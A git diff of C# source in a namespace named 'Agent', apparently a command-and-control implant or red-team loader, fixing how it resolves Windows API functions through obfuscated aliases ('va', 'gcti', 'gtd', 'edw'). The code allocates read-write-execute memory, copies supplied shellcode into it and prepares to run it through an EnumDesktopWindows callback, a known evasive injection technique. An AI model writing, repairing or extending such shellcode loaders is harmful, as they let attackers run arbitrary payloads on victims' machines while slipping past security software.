@@ -38,23 +38,27 @@ namespace Agent
 
         private bool Run(IntPtr hTarget, byte[] shellcode)
         {
-            List<string> resolveFuncs = new List<string>
+            List<string> k32Funcs = new List<string>
             {
-                "va",
-                "gcti",                //GetCurrentThreadId (kernel32.dll 
-                "gtd",                //GetThreadDesktop (user32.dll)
-                //"edw"                //EnumDesktopWindows (user32.dll)
-
+                "va",        // VirtualAlloc (kernel32.dll)
+                "gcti"       // GetCurrentThreadId (kernel32.dll)
             };
-            //resolve u32 funcs
-            if (!Resolver.TryResolveFuncs(resolveFuncs, "k32", out var err) | !Resolver.TryResolveFuncs(resolveFuncs, "u32", out var err2))
+
+            List<string> u32Funcs = new List<string>
             {
+                "gtd",        // GetThreadDesktop (user32.dll)
+                "edw"      // EnumDesktopWindows (user32.dll)
+            };
+
+            //resolve u32 and k32 funcs
+            if (!Resolver.TryResolveFuncs(k32Funcs, "k32", out var err) | !Resolver.TryResolveFuncs(u32Funcs, "u32", out var err2))
+            {
+                Console.WriteLine(err);
+                Console.WriteLine(err2);
                 return false;
             }
 
-            //Injection code; optionally add API hashing or AES encryption
-
-
+            //Injection
 
             //IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
             object[] vaParams = new object[] { IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE };
@@ -69,9 +73,7 @@ namespace Agent
 
             Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
 
-            //IntPtr hDesktop = GetThreadDesktop(GetCurrentThreadId()); //adding deleegate
-
-            // Define parameters for GetThreadDesktop and GetCurrentThreadId
+            //IntPtr hDesktop = GetThreadDesktop(GetCurrentThreadId()); 
             object[] gctParams = new object[] { }; // No parameters for GetCurrentThreadId
             uint threadId = Generic.InvokeFunc<uint>(Resolver.GetFunc("gcti"), typeof(GCTDelegate), ref gctParams);
 
@@ -112,6 +114,7 @@ namespace Agent
         private delegate IntPtr VADelegate(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);
         private delegate IntPtr GTDDelegate(uint dwThreadId);
         private delegate uint GCTDelegate();
+        private delegate bool EnumDesktopWindowsDelegate(IntPtr hDesktop, EnumDesktopWindowsProc lpEnumFunc, IntPtr lParam);
 
 
         //constants
